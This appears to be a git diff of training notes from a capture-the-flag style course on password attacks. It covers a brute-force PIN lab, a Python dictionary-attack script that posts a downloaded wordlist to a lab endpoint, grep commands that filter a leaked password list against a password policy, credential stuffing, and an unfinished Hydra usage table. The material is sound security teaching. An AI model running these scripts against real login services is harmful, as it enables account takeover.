@@ -98,7 +98,7 @@ While a complex password can take **years** to brute-force with a single machine
 Comparing the basic computer and the supercomputer:
 - **Basic Computer (1 million passwords/second)**: Good for cracking simple passwords quickly but becomes impractically slow for complex passwords. For instance, cracking an 8-character password using letters and digits would take approximately 6.92 years.
 - **Supercomputer (1 trillion passwords/second)**: Drastically reduces cracking times for simpler passwords. However, even with this immense power, cracking highly complex passwords can take an impractical amount of time. For example, a 12-character password with all ASCII characters would still take about **15000** years to crack.
-# Bute Force Attacks
+# Brute Force Attacks
 ##  Cracking the PIN
 The example application generates a random **4-digit PIN** and exposes an endpoint (`/pin`) that accepts a **PIN** as a query parameter. If the provided **PIN** matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.
 
@@ -138,6 +138,137 @@ Attempted PIN: 4052
 Correct PIN found: 4053
 Flag: HTB{...}
 ```
-## Dictionary Attacks 
-The effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones. A well-crafted wordlist tailored to the target audience or system can significantly increase the probability of a successful breach. For instance, if the target is a system frequented by gamers, a wordlist enriched with gaming-related terminology and jargon would prove more effective than a generic dictionary.
+## Dictionary Attack
+The example application creates a route (`/dictionary`) that handles **POST** requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. 
 
+If there's a match, it responds with a **JSON** object containing a success message and the flag. Otherwise, it returns an error message with a **401** status code (**Unauthorized**).
+
+Copy and paste this Python script below as `dictionary-solver.py` onto your machine. You only need to modify the **IP** and **port** variables to match your target system information:
+```python
+import requests
+
+ip = "127.0.0.1"  # Change this to your instance IP address
+port = 1234       # Change this to your instance port number
+
+# Download a list of common passwords from the web and split it into lines
+passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()
+
+# Try each password from the list
+for password in passwords:
+    print(f"Attempted password: {password}")
+
+    # Send a POST request to the server with the password
+    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
+
+    # Check if the server responds with success and contains the 'flag'
+    if response.ok and 'flag' in response.json():
+        print(f"Correct password found: {password}")
+        print(f"Flag: {response.json()['flag']}")
+        break
+```
+
+```bash
+$ python3 dictionary-solver.py
+
+...SNIP...
+Attempted password: golf
+Attempted password: bear
+Attempted password: tiger
+Correct password found: ...
+Flag: HTB{...}
+```
+The Python script orchestrates the dictionary attack. It performs the following steps:
+1. **Downloads the Wordlist**: First, the script fetches a wordlist of **500 commonly used** (and therefore weak) passwords from **SecLists** using the `requests` library.
+
+2. **Iterates and Submits Passwords:** It then iterates through each password in the downloaded wordlist. For each password, it sends a **POST** request to the Flask application's `/dictionary` endpoint, including the password in the request's form data.
+
+3. **Analyses Responses:** The script checks the response status code after each request. If it's **200** (**OK**), it examines the response content further. If the response contains the "**flag**" key, it signifies a successful login. The script then prints the discovered password and the captured flag.
+
+4. **Continues or Terminates:** If the response doesn't indicate success, the script proceeds to the next password in the wordlist. This process continues until the correct password is found or the entire wordlist is exhausted.
+## Hybrid Attacks Explained
+Many organizations implement policies **requiring users to change their passwords periodically** to enhance security. However, these policies can inadvertently breed predictable password patterns.
+![[Pasted image 20241217003428.png]]
+### Hybrid Attacks in Action
+Let's illustrate this. Consider an attacker targeting an organization known to enforce regular password changes.
+![[Pasted image 20241217003522.png]]
+The attacker begins by launching a dictionary attack, using a wordlist curated with common passwords, industry-specific terms, and potentially personal information related to the organization or its employees. **This phase attempts to quickly identify any low-hanging fruit - accounts protected by weak or easily guessable passwords.**
+
+However, if the dictionary attack proves unsuccessful, the hybrid attack seamlessly transitions into a **brute-force mode**. Instead of randomly generating password combinations, it strategically modifies the words from the original wordlist, appending numbers, special characters, or even incrementing years, as in the "**Summer2023**" example.
+### The Power of Hybrid Attacks
+The effectiveness of hybrid attacks lies in their adaptability and efficiency. They leverage the strengths of both dictionary and brute-force techniques, maximizing the chances of cracking passwords, especially in scenarios where users fall into predictable patterns.
+
+It's important to note that hybrid attacks **are not limited to the password change scenario described above**. They can be tailored to exploit any **observed** or **suspected** password patterns within a target organization. Let's consider a scenario where you have access to a common passwords wordlist, and you're targeting an organization with the following password policy:
+- Minimum length: 8 characters
+- Must include:
+    - At least one uppercase letter
+    - At least one lowercase letter
+    - At least one number
+
+To extract only the passwords that adhere to this policy, we can leverage `grep` paired with `regex`. We are going to use the [darkweb2017-top10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt) password list for this. First, download the wordlist like:
+```bash
+$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
+```
+
+Next, we need to start matching that wordlist to the password policy:
+```bash
+$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
+```
+This `grep` command targets the requirement of **a minimum password length of 8 characters**. The regular expression `^.{8,}$` acts as a filter, ensuring that only passwords containing **at least 8 characters** are passed through and saved in a temporary file named `darkweb2017-minlength.txt`.
+
+Then let's match passwords with uppercase letters:
+```bash
+$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
+```
+This `grep` command adheres the policy's demand for **at least one uppercase letter**. The regular expression `[A-Z]` ensures that any password lacking an uppercase letter is discarded.
+
+Next, let's get passwords which have lowercase letters:
+```bash
+$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
+```
+This `grep` command ensures compliance with the policy's requirement for **at least one lowercase letter**. The regular expression `[a-z]` serves as the filter, keeping only passwords that include at least one lowercase letter and storing them in `darkweb2017-lowercase.txt`.
+
+And lastly, let's get all passwords containing at least one number:
+```bash
+$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
+```
+This last `grep` adheres to the numerical requirement. The regular expression `[0-9]` acts as a filter, ensuring that passwords containing at least one numerical digit are preserved in `darkweb2017-number.txt`.
+
+Now to check the amount of words within the filtered password list:
+```bash
+$ wc -l darkweb2017-number.txt
+
+89 darkweb2017-number.txt
+```
+Meticulously filtering the extensive **10,000-password list** against the password policy has dramatically narrowed down our potential passwords to **89**. A smaller, targeted list translates to a faster and more focused attack, increasing the likelihood of a successful breach.
+
+## Credential Stuffing: Using Stolen Data for Unauthorized Access
+Credential stuffing exploits the fact that many users reuse passwords across multiple online accounts.
+![[Pasted image 20241217004539.png]]
+It's a **multi-stage** process that begins with attackers **acquiring lists** of **compromised usernames and passwords**. These lists can stem from large-scale data breaches or be compiled through phishing scams and malware. Public wordlists like `rockyou` or those in `seclists` can also serve as a starting point.
+
+Once armed with these credentials, attackers identify potential targets - online services likely used by the individuals whose information they possess. **Social media, email providers, online banking, and e-commerce sites** are prime targets due to the sensitive data they often hold.
+
+The attack then shifts into an automated phase. Attackers use **tools** or **scripts** to systematically test the stolen credentials against the chosen targets, often mimicking normal user behaviour to avoid detection. This allows them to **rapidly** test vast numbers of credentials, increasing their chances of finding a match.
+
+# Hydra
+**Hydra** is a **fast network login cracker** that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including **web apps**, remote login services like **SSH** and **FTP**, and **even databases**.
+
+Hydra's popular due to its:
+- **Speed and Efficiency:** Hydra utilizes parallel connections to perform multiple login attempts simultaneously.
+- **Flexibility:** Hydra supports many protocols and services, making it adaptable to various attack scenarios.
+## Basic Usage
+```bash
+$ hydra [login_options] [password_options] [attack_options] [service_options]
+```
+Where:
+
+| Parameter              | Explanation | Usage Example |
+| ---------------------- | ----------- | ------------- |
+| `-l LOGIN`or `-L FILE` |             |               |
+| `-p PASS` or `-P FILE` |             |               |
+| `-t TASKS`             |             |               |
+| `-f`                   |             |               |
+| `-s PORT`              |             |               |
+| `-v` or `-V`           |             |               |
+| `service://server`     |             |               |
+| `/OPT`                 |             |               |
